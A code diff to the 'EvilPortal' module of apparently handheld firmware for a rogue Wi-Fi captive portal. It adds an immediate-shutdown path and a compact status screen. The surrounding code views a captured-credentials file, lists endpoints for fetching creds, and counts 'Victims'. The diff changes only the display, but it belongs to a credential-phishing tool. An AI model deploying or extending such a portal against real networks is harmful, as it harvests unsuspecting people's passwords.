@@ -324,26 +324,32 @@ void EvilPortal::loop() {
             shouldRedraw = true;
         }
 
-        if (check(EscPress)) {
-            options = {
-                {"Exit Portal", [&exitPortal]() { exitPortal = true; }},
-                {"View Creds",
-                 [this, &shouldRedraw]() {
-                     FS *fs;
-                     if (getFsStorage(fs)) {
-                         if (fs->exists(kvx::paths::WIFI_PORTAL_CREDS)) {
-                             loopSD(*fs, false, "CSV", kvx::paths::WIFI_PORTAL_CREDS);
-                         } else {
-                             displayTextLine("No credentials yet");
-                             vTaskDelay(1000);
+        if (check(EscPress) || forceHome) {
+            // G0 Home: shut down portal immediately — do not open Esc options.
+            if (forceHome) {
+                exitPortal = true;
+            } else {
+                options = {
+                    {"Exit Portal", [&exitPortal]() { exitPortal = true; }},
+                    {"View Creds",
+                     [this, &shouldRedraw]() {
+                         FS *fs;
+                         if (getFsStorage(fs)) {
+                             if (fs->exists(kvx::paths::WIFI_PORTAL_CREDS)) {
+                                 loopSD(*fs, false, "CSV", kvx::paths::WIFI_PORTAL_CREDS);
+                             } else {
+                                 displayTextLine("No credentials yet");
+                                 vTaskDelay(1000);
+                             }
                          }
-                     }
-                     shouldRedraw = true;
-                 }},
-                {"Resume", [&shouldRedraw]() { shouldRedraw = true; }}
-            };
+                         shouldRedraw = true;
+                     }},
+                    {"Resume", [&shouldRedraw]() { shouldRedraw = true; }}
+                };
 
-            loopOptions(options);
+                loopOptions(options);
+                if (forceHome) exitPortal = true;
+            }
             if (exitPortal) {
                 displayTextLine("Shutting down...");
                 vTaskDelay(100 / portTICK_PERIOD_MS);
@@ -434,25 +440,31 @@ void EvilPortal::drawScreen() {
     printSubtitle(subtitle);
 
     String apIp = WiFi.softAPIP().toString();
-    padprintln("");
+    const bool shortScreen = tftHeight <= 135;
+    if (!shortScreen) padprintln("");
     if (kvxConfig.evilPortalEndpoints.showEndpoints) {
         if (kvxConfig.evilPortalEndpoints.allowGetCreds) {
-            padprintln("-> " + apIp + kvxConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
+            String line = "-> " + apIp + kvxConfig.evilPortalEndpoints.getCredsEndpoint;
+            if (shortScreen && line.length() > 28) line = line.substring(0, 28);
+            else if (!shortScreen) line += " -> get creds";
+            padprintln(line);
         } else {
             padprintln("-> cred access disabled");
         }
-        if (kvxConfig.evilPortalEndpoints.allowSetSsid) {
-            padprintln("-> " + apIp + kvxConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
-        } else {
-            padprintln("-> SSID change disabled");
+        if (!shortScreen) {
+            if (kvxConfig.evilPortalEndpoints.allowSetSsid) {
+                padprintln("-> " + apIp + kvxConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
+            } else {
+                padprintln("-> SSID change disabled");
+            }
         }
     } else {
         padprintln("Endpoints hidden");
     }
-    padprintln("");
+    if (!shortScreen) padprintln("");
 
     padprintln("Captive Portal: ACTIVE");
-    padprintln("Notifications: ENABLED");
+    if (!shortScreen) padprintln("Notifications: ENABLED");
 
     if (!_verifyPwd) {
         padprint("Victims: " + String(totalCapturedCredentials));
